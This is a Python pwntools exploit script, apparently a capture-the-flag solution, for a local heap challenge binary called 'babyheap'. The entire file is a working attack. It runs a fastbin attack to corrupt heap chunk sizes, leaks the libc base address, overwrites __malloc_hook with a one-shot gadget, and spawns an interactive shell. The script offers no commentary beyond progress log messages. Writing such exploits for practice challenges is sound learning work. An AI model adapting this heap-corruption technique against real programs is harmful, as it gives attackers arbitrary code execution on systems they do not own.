
#!/usr/bin/python

from pwn import *
import sys

LOCAL = True

def info(s):
	log.info(s)

def allocate(s):
	r.sendline("1")
	r.sendlineafter(": ","%s"%s)
	# print r.recvline(),
	r.recvuntil(": ")

def fill(idx,txt):
	r.sendline("2")
	r.sendlineafter(": ","%s"%idx)
	r.sendlineafter(": ","%s"%(len(txt)))
	r.sendafter(": ","%s"%txt)
	r.recvuntil(": ")

def free(idx):
	r.sendline("3")
	r.sendlineafter(": ","%s"%idx)
	r.recvuntil(": ")

def dump(idx):
	r.sendline("4")
	r.sendlineafter(": ","%s"%idx)
	r.readline()
	data = r.readline()
	r.recvuntil(": ")
	return data

def exploit(r):
	BINBASH = 0x41374
	MALLOC_HOOK = 0x3a55ed

	r.recvuntil(": ")
	info("Allocate 4 Fastbin")
	allocate(0x20)
	allocate(0x20)
	allocate(0x20)
	allocate(0x20)

	info("Allocate a Smallbin")
	allocate(0x80)

	info("Free Fastbin (index 1 , 2)")
	free(1)
	free(2)

	info("Fastbin Attack: Phase 1 (Overwrite Address of Top Fastbin)")
	payload = p64(0)*5
	payload += p64(0x31)
	payload += p64(0)*5
	payload += p64(0x31)
	payload += p8(0xc0)
	fill(0,payload)

	info("Fastbin Attack: Phase 2 (Overwite Size of Smallbin)")
	payload = p64(0)*5
	payload += p64(0x31)
	fill(3,payload)

	info("Allocate 2 Fastbin")
	allocate(0x20)
	allocate(0x20)

	info("Fastbin Attack: Phase 3 (Overwite Size of Smallbin->size with 0x91) for Deny Corruption")
	payload = p64(0)*5
	payload += p64(0x91)
	fill(3,payload)

	allocate(0x80)

	info("Free Smallbin")
	free(4)

	allocate(0x68)

	payload = p64(0)*13
	payload += p64(0xf1)
	fill(4,payload)

	allocate(0x60)

	leak_libc = u64(dump(5)[10*8:10*8+8]) - 0x3a5678
	info("LEAK LIBC BASE:	%s"%(hex(leak_libc)))

	free(6)
	free(4)

	payload = p64(0)*5
	payload += p64(0x71)
	info("Write on MallocHOOK : %s"%(hex(leak_libc+MALLOC_HOOK)))
	payload += p64(leak_libc+MALLOC_HOOK)
	payload += p64(0)*16
	payload += p64(0x90)
	fill(3,payload)


	allocate(0x60)
	allocate(0x60)

	info("Write OneShot on __malloc_hook")
	payload = "\x00"*3
	payload += p64(0)*2
	payload += p64(leak_libc+BINBASH)
	fill(6,payload)

	info("Spawn a SHELL")
	r.sendline("1")
	r.sendlineafter(":" , "10")

	r.interactive()
	return


if __name__ == '__main__':

	r = process(['./babyheap'],env={"LD_PRELOAD":"./libc.so.6"})
	print util.proc.pidof(r)
	pause()
	exploit(r)
